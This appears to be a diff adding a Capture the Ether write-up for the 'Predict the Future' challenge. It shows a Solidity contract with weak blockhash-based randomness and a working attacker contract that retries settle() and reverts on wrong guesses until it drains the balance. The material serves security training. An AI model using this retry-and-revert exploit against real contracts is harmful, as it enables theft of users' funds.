@@ -256,3 +256,82 @@ contract GuessNewNumberTest is Test {
     receive() external payable {}
 }
 ```
+
+## Capture the Ether (RareSkills Repo) - Predict the Future
+
+### Contract
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+contract PredictTheFuture {
+    address guesser;
+    uint8 guess;
+    uint256 settlementBlockNumber;
+
+    constructor() payable {
+        require(msg.value == 1 ether);
+    }
+
+    function isComplete() public view returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    function lockInGuess(uint8 n) public payable {
+        require(guesser == address(0));
+        require(msg.value == 1 ether);
+
+        guesser = msg.sender;
+        guess = n;
+        settlementBlockNumber = block.number + 1;
+    }
+
+    function settle() public {
+        require(msg.sender == guesser);
+        require(block.number > settlementBlockNumber);
+
+        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
+
+        guesser = address(0);
+        if (guess == answer) {
+            (bool ok,) = msg.sender.call{value: 2 ether}("");
+            require(ok, "Failed to send to msg.sender");
+        }
+    }
+}
+```
+
+### Exploit
+
+Note that `answer` has to be an integer between 0 and 9 because it is computed modulo 10. Therefore, we can lock in any guess, e.g., 0, and spam the contract by calling `settle` multiple times across multiple blocks. Notice that because `settle` will reset `guesser` to the zero address, we need to ensure the transaction reverts if we guessed wrong. (Otherwise, we'd be required to always call `lockInGuess` before calling `settle`. In particular, we'd be required to pay 1 ether for each attempt, making our spamming strategy unprofitable.)
+
+We can conveniently execute this attack in Remix using the attacker contract below.
+
+NOTE: `lockInGuess` must be called via the attacker contract to pass `require(msg.sender == guesser)` during settlement.
+
+```solidity
+//SPDX-License-Identifier: UNLICENSE
+pragma solidity ^0.8.13;
+
+import "./PredictTheFuture.sol";
+
+contract ExploitContract {
+    PredictTheFuture public predictTheFuture;
+
+    constructor(PredictTheFuture _predictTheFuture) {
+        predictTheFuture = _predictTheFuture;
+    }
+
+    function lockInGuess() external payable {
+        predictTheFuture.lockInGuess{value: 1 ether}(0);
+    }
+
+    function attack() external {
+        predictTheFuture.settle();
+        require(predictTheFuture.isComplete(), "Exploit failed");
+    }
+
+    receive() external payable {} 
+}
+```
